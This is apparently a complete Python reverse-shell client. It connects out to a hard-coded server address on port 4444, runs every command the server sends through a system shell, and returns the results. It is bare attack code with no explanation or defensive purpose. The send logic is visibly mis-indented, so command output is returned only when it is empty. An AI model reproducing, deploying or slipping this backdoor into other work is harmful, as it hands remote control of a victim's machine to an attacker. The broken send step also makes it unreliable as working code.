import sys
import socket
import subprocess
#change ip to server ip
SERVER = '192.168.8.128'
PORT = 4444
s = socket.socket()

s.connect ((SERVER , PORT))
msg = s.recv(1024).decode()
print('[*] server: ',msg)
while True:
    cmd = s.recv(1024).decode()
    print(f'[+] recevied command: {cmd}')
    if cmd.lower() in ['quit','exit']:
        break
    try:
        result = subprocess.check_output(cmd,stderr=subprocess.STDOUT,shell=True)
    except Exception as e:
        result = str(e).encode()
    if len(result) == 0 :
        result = '[+] Executed Successfully'.encode()
        s.send(result)
s.close()